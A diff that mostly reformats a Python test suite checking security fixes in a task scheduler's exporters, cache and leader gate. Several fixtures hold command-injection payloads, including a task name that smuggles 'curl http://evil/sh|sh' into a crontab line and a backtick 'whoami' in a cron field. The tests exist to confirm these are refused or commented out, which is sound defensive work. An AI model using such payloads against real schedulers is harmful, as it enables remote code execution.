@@ -8,15 +8,11 @@ refactor that silently reverts the protection trips the suite.
 
 from __future__ import annotations
 
-import math
-import re
-import secrets
 import uuid
 from datetime import UTC, datetime, timedelta
 from unittest.mock import MagicMock
 
 import pytest
-
 
 # =====================================================================
 # C-2: TriggerSchedule leader-gate check
@@ -45,7 +41,7 @@ class TestC2TriggerScheduleLeaderGate:
         )
 
         class _StandbyGate:
-            def is_leader(self, project_id) -> bool:  # noqa: ANN001
+            def is_leader(self, project_id) -> bool:
                 return False
 
         cache = ScheduleCache()
@@ -116,7 +112,7 @@ class TestC2TriggerScheduleLeaderGate:
 
         dispatcher = MagicMock()
 
-        async def _ok(*, schedule_id):  # noqa: ARG001, ANN001
+        async def _ok(*, schedule_id, **_kwargs):
             return FireResult(
                 command_id=uuid.uuid4(),
                 error_code=None,
@@ -133,7 +129,9 @@ class TestC2TriggerScheduleLeaderGate:
         )
 
         request = pb.TriggerScheduleRequest(
-            schedule_id=str(sid), user_id="", idempotency_key="",
+            schedule_id=str(sid),
+            user_id="",
+            idempotency_key="",
         )
         response = await servicer.TriggerSchedule(request, MagicMock())
         assert response.error_code == ""
@@ -157,10 +155,17 @@ class TestC1CeleryExporterSafety:
         from z4j_scheduler.exporters.celery import render
 
         sched = ExportedSchedule(
-            id="x", name="evil", engine="celery", kind="solar",
+            id="x",
+            name="evil",
+            engine="celery",
+            kind="solar",
             expression="evil_event:0:0",
-            task_name="t", timezone="UTC", queue=None,
-            args=[], kwargs={}, is_enabled=True,
+            task_name="t",
+            timezone="UTC",
+            queue=None,
+            args=[],
+            kwargs={},
+            is_enabled=True,
         )
         out = render([sched])
         assert "REFUSED" in out
@@ -174,10 +179,17 @@ class TestC1CeleryExporterSafety:
         from z4j_scheduler.exporters.celery import render
 
         sched = ExportedSchedule(
-            id="x", name="naninf", engine="celery", kind="solar",
+            id="x",
+            name="naninf",
+            engine="celery",
+            kind="solar",
             expression="sunrise:nan:0",
-            task_name="t", timezone="UTC", queue=None,
-            args=[], kwargs={}, is_enabled=True,
+            task_name="t",
+            timezone="UTC",
+            queue=None,
+            args=[],
+            kwargs={},
+            is_enabled=True,
         )
         out = render([sched])
         assert "REFUSED" in out
@@ -188,10 +200,17 @@ class TestC1CeleryExporterSafety:
         from z4j_scheduler.exporters.celery import render
 
         sched = ExportedSchedule(
-            id="x", name="naninf2", engine="celery", kind="solar",
+            id="x",
+            name="naninf2",
+            engine="celery",
+            kind="solar",
             expression="sunrise:0:inf",
-            task_name="t", timezone="UTC", queue=None,
-            args=[], kwargs={}, is_enabled=True,
+            task_name="t",
+            timezone="UTC",
+            queue=None,
+            args=[],
+            kwargs={},
+            is_enabled=True,
         )
         out = render([sched])
         assert "REFUSED" in out
@@ -201,10 +220,17 @@ class TestC1CeleryExporterSafety:
         from z4j_scheduler.exporters.celery import render
 
         sched = ExportedSchedule(
-            id="x", name="oor", engine="celery", kind="solar",
+            id="x",
+            name="oor",
+            engine="celery",
+            kind="solar",
             expression="sunrise:91:0",
-            task_name="t", timezone="UTC", queue=None,
-            args=[], kwargs={}, is_enabled=True,
+            task_name="t",
+            timezone="UTC",
+            queue=None,
+            args=[],
+            kwargs={},
+            is_enabled=True,
         )
         out = render([sched])
         assert "REFUSED" in out
@@ -215,10 +241,17 @@ class TestC1CeleryExporterSafety:
         from z4j_scheduler.exporters.celery import render
 
         sched = ExportedSchedule(
-            id="x", name="ok", engine="celery", kind="solar",
+            id="x",
+            name="ok",
+            engine="celery",
+            kind="solar",
             expression="sunrise:40.7128:-74.0060",
-            task_name="t", timezone="UTC", queue=None,
-            args=[], kwargs={}, is_enabled=True,
+            task_name="t",
+            timezone="UTC",
+            queue=None,
+            args=[],
+            kwargs={},
+            is_enabled=True,
         )
         out = render([sched])
         assert "REFUSED" not in out
@@ -229,24 +262,27 @@ class TestC1CeleryExporterSafety:
         from z4j_scheduler.exporters.celery import render
 
         sched = ExportedSchedule(
-            id="x", name="badcron", engine="celery", kind="cron",
+            id="x",
+            name="badcron",
+            engine="celery",
+            kind="cron",
             # Backtick in a cron field - shell metachar.
             expression="0 `whoami` * * *",
-            task_name="t", timezone="UTC", queue=None,
-            args=[], kwargs={}, is_enabled=True,
+            task_name="t",
+            timezone="UTC",
+            queue=None,
+            args=[],
+            kwargs={},
+            is_enabled=True,
         )
         out = render([sched])
         assert "REFUSED" in out
         # The rendered file must not contain ``crontab(`` for this row.
         # (The other branch comment lines are allowed to mention it.)
         active_lines = [
-            line for line in out.splitlines()
-            if line.strip() and not line.lstrip().startswith("#")
+            line for line in out.splitlines() if line.strip() and not line.lstrip().startswith("#")
         ]
-        assert not any(
-            "crontab(minute=" in line and "`whoami`" in line
-            for line in active_lines
-        )
+        assert not any("crontab(minute=" in line and "`whoami`" in line for line in active_lines)
 
 
 # =====================================================================
@@ -317,21 +353,21 @@ class TestSourceHashCoverage:
     def _make(self, **overrides):
         from z4j_scheduler.importers._core import ImportedSchedule
 
-        defaults = dict(
-            project_slug="acme",
-            name="hourly",
-            engine="celery",
-            kind="cron",
-            expression="0 * * * *",
-            task_name="tasks.t",
-            timezone="UTC",
-            queue=None,
-            args=[],
-            kwargs={},
-            catch_up="skip",
-            is_enabled=True,
-            source="imported",
-        )
+        defaults = {
+            "project_slug": "acme",
+            "name": "hourly",
+            "engine": "celery",
+            "kind": "cron",
+            "expression": "0 * * * *",
+            "task_name": "tasks.t",
+            "timezone": "UTC",
+            "queue": None,
+            "args": [],
+            "kwargs": {},
+            "catch_up": "skip",
+            "is_enabled": True,
+            "source": "imported",
+        }
         defaults.update(overrides)
         return ImportedSchedule(**defaults)
 
@@ -382,14 +418,17 @@ class TestWatchStreamResumeForward:
         from z4j_scheduler.storage.watch import WatchStream
 
         class _FakeClient:
-            async def list_schedules(self, project_id):  # noqa: ANN001
+            async def list_schedules(self, project_id):
                 # Force the async generator shape the real client
                 # exposes.
                 if False:
                     yield None  # type: ignore[unreachable]
 
             async def watch_schedules(
-                self, project_id, *, resume_token,  # noqa: ANN001
+                self,
+                project_id,
+                *,
+                resume_token,
             ):
                 if False:
                     yield None  # type: ignore[unreachable]
@@ -417,12 +456,15 @@ class TestWatchStreamResumeForward:
         from z4j_scheduler.storage.watch import WatchStream
 
         class _FakeClient:
-            async def list_schedules(self, project_id):  # noqa: ANN001
+            async def list_schedules(self, project_id):
                 if False:
                     yield None  # type: ignore[unreachable]
 
             async def watch_schedules(
-                self, project_id, *, resume_token,  # noqa: ANN001
+                self,
+                project_id,
+                *,
+                resume_token,
             ):
                 if False:
                     yield None  # type: ignore[unreachable]
@@ -437,9 +479,7 @@ class TestWatchStreamResumeForward:
         far_future = (datetime.now(UTC) + timedelta(hours=24)).isoformat()
         ws._resume_token = far_future
         await ws._sync_then_watch()
-        assert ws._resume_token == far_future, (
-            "resume token must not be downgraded by a fresh sync"
-        )
+        assert ws._resume_token == far_future, "resume token must not be downgraded by a fresh sync"
 
 
 # =====================================================================
@@ -463,25 +503,30 @@ class TestUpdateFireStateAtomicity:
         sid = uuid.uuid4()
         await cache.upsert(
             ScheduleEntry(
-                id=sid, project_id=uuid.uuid4(),
+                id=sid,
+                project_id=uuid.uuid4(),
                 kind="cron",
-                expression="0 * * * *", timezone="UTC",
-                is_enabled=True, catch_up="skip",
+                expression="0 * * * *",
+                timezone="UTC",
+                is_enabled=True,
+                catch_up="skip",
                 anchor_at=datetime(2026, 1, 1, tzinfo=UTC),
-                last_fire_at=None, name="x",
+                last_fire_at=None,
+                name="x",
             ),
         )
         await cache.remove(sid)
         # Update on a removed id returns False; no-op.
         result = await cache.update_fire_state(
-            sid, last_fire_at=datetime.now(UTC),
+            sid,
+            last_fire_at=datetime.now(UTC),
         )
         assert result is False
 
     @pytest.mark.asyncio
     async def test_unset_sentinel_leaves_field_untouched(self) -> None:
         """Verify the _UNSET sentinel actually skips writing."""
-        from z4j_scheduler.storage.cache import ScheduleCache, _UNSET
+        from z4j_scheduler.storage.cache import _UNSET, ScheduleCache
         from z4j_scheduler.tick._entry import ScheduleEntry
 
         cache = ScheduleCache()
@@ -489,18 +534,24 @@ class TestUpdateFireStateAtomicity:
         original_last = datetime(2026, 4, 26, 12, 0, tzinfo=UTC)
         await cache.upsert(
             ScheduleEntry(
-                id=sid, project_id=uuid.uuid4(),
+                id=sid,
+                project_id=uuid.uuid4(),
                 kind="cron",
-                expression="0 * * * *", timezone="UTC",
-                is_enabled=True, catch_up="skip",
+                expression="0 * * * *",
+                timezone="UTC",
+                is_enabled=True,
+                catch_up="skip",
                 anchor_at=datetime(2026, 1, 1, tzinfo=UTC),
-                last_fire_at=original_last, name="x",
+                last_fire_at=original_last,
+                name="x",
             ),
         )
         # Update only next_fire_at; last_fire_at unset → preserved.
         new_next = datetime(2026, 4, 26, 13, 0, tzinfo=UTC)
         await cache.update_fire_state(
-            sid, last_fire_at=_UNSET, next_fire_at=new_next,
+            sid,
+            last_fire_at=_UNSET,
+            next_fire_at=new_next,
         )
         entry = await cache.get(sid)
         assert entry is not None
@@ -516,10 +567,13 @@ class TestUpdateFireStateAtomicity:
         cache = ScheduleCache()
         sid = uuid.uuid4()
         entry = ScheduleEntry(
-            id=sid, project_id=uuid.uuid4(),
+            id=sid,
+            project_id=uuid.uuid4(),
             kind="cron",
-            expression="0 * * * *", timezone="UTC",
-            is_enabled=True, catch_up="skip",
+            expression="0 * * * *",
+            timezone="UTC",
+            is_enabled=True,
+            catch_up="skip",
             anchor_at=datetime(2026, 1, 1, tzinfo=UTC),
             last_fire_at=None,
             name="x",
@@ -554,12 +608,16 @@ class TestRound3CronExporterTaskNameSanitized:
         from z4j_scheduler.exporters.cron import render
 
         sched = ExportedSchedule(
-            id="x", name="ok",
-            engine="celery", kind="cron",
+            id="x",
+            name="ok",
+            engine="celery",
+            kind="cron",
             expression="0 * * * *",
             task_name="x\n* * * * * curl http://evil/sh|sh\n#",
-            timezone="UTC", queue=None,
-            args=[], kwargs={},
+            timezone="UTC",
+            queue=None,
+            args=[],
+            kwargs={},
             is_enabled=False,
         )
         out = render([sched])
@@ -569,8 +627,7 @@ class TestRound3CronExporterTaskNameSanitized:
             stripped = line.strip()
             if "curl http://evil" in stripped:
                 assert stripped.startswith("#"), (
-                    "task_name newline broke out of the comment - "
-                    f"active line: {line!r}"
+                    f"task_name newline broke out of the comment - active line: {line!r}"
                 )
 
     def test_interval_branch_strips_name_newlines(self) -> None:
@@ -581,19 +638,20 @@ class TestRound3CronExporterTaskNameSanitized:
         sched = ExportedSchedule(
             id="x",
             name="hourly\n* * * * * touch /tmp/pwned\n#",
-            engine="celery", kind="interval",
+            engine="celery",
+            kind="interval",
             expression="3600s",
             task_name="t.t",
-            timezone="UTC", queue=None,
-            args=[], kwargs={},
+            timezone="UTC",
+            queue=None,
+            args=[],
+            kwargs={},
             is_enabled=True,
         )
         out = render([sched])
         for line in out.splitlines():
             if "/tmp/pwned" in line.strip():
-                assert line.strip().startswith("#"), (
-                    f"name newline broke out of comment: {line!r}"
-                )
+                assert line.strip().startswith("#"), f"name newline broke out of comment: {line!r}"
 
     def test_one_shot_branch_strips_name_newlines(self) -> None:
         from z4j_scheduler.exporters._client import ExportedSchedule
@@ -602,16 +660,17 @@ class TestRound3CronExporterTaskNameSanitized:
         sched = ExportedSchedule(
             id="x",
             name="ok\n* * * * * touch /tmp/pwned\n#",
-            engine="celery", kind="one_shot",
+            engine="celery",
+            kind="one_shot",
             expression="2026-12-31T23:59:59Z",
             task_name="t.t",
-            timezone="UTC", queue=None,
-            args=[], kwargs={},
+            timezone="UTC",
+            queue=None,
+            args=[],
+            kwargs={},
             is_enabled=True,
         )
         out = render([sched])
         for line in out.splitlines():
             if "/tmp/pwned" in line.strip():
-                assert line.strip().startswith("#"), (
-                    f"name newline broke out of comment: {line!r}"
-                )
+                assert line.strip().startswith("#"), f"name newline broke out of comment: {line!r}"
